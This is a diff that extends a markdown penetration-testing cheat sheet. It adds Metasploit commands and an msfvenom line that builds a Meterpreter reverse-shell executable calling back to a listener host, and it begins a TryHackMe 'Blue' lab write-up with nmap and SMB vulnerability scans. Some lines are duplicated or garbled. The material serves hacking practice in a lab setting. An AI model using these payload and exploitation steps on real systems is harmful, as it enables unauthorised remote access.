@@ -265,4 +265,87 @@ $ set [option] [value]
 
 # Execute the selected module
 $ exploit
+
+# List active sessions
+$ sessions
+
+# Interact with a session
+$ sessions -i [id]
+
+# Perform Nmap scan and save result
+$ db_nmap [target]
+
+# Initiate a TCP port scan
+$ use aux/...
+
+# Set up a payload handler
+$ use exploit/multi/handler
+
+# Specify payload for exploitation
+$ set PAYLOAD [payload]
+
+# Set target host
+$ set RHOSTS [target]
+# Set target host
+$ set RHOSTS [target]
+
+# Set local host ip for reverse connections
+$ set LHOST [host]
+
+# Execute post-exploitation modules
+$ use post/multi/gather
+
+# Utilize evasion techniques
+$ use evasion/[technique]
+
+# Enumerate credentilas
+$ use aux//..
+
+# Export data from Metasploit database
+$ db_export -f [format] -a [filename]
+
+# MSFVenom
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=xxxx -f exe > rev_shell.exe
+
+```
+
+---
+
+## Hacking into a windows Machine called BLUE
+
+**Task 1 : Recon**
+**Task 2 : Gain Access**
+**Task 3 : Escalate**
+**Task 4 : Cracking**
+**Task 5 : Find flags**
+
+### Task 1 : Recon
+
+- The first thing to do is to run a TCP Nmap scan against the 1000 most common ports, and using the following flags:
+  - _-sC_ to run default scripts
+  - _-sV_ to enumerate applications versions
+  - _-Pn_ to skip the host discovery phase, as some hosts will not respond to ping requests
+
+```bash
+# To connect with the tryhackme.io vpn
+$ openvpn infotechnetwork1.ovpn
+
+# Recon and nmap scan
+$ nmap -sC -sV -Pn $ip
+
+# Now we will scan the open ports with nmap for smb vulnerabilities
+$ nmap -p 139,135,445,3389 -Pn --script smb-vuln\* <ip>
+
+$ nmap -p445 --script smb-protocols 192.168.216.129
+
+$ exploit
+```
+
+![nmap port scan](./nmap.png)
+
+The only ports that can be enumerated at the moment are 139 (SMB) and potentially 135 (RPC) as all other port are used for MSRPC
+
+```bash
+Update Msf
+$ apt msfupdate
 ```
